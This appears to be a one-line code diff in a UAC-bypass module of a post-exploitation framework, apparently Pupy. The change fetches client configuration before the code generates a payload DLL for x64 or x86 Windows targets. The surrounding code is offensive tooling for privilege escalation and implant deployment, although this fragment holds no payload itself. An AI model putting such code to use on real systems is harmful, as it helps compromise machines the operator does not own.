@@ -123,6 +123,7 @@ class bypassuac():
         logging.debug("Address configured is %s:%s for pupy dll..."%(host,port))
         logging.debug("Looking for process architecture...")
 
+        conf = self.module.client.get_conf()
         if "64" in self.module.client.desc["os_arch"] and not force_x86_dll:
             logging.debug("Target achitecture is x64, using a x64 dll")
             dllbuff, _, _ = pupygen.generate_binary_from_template(conf, 'windows', arch='x64')
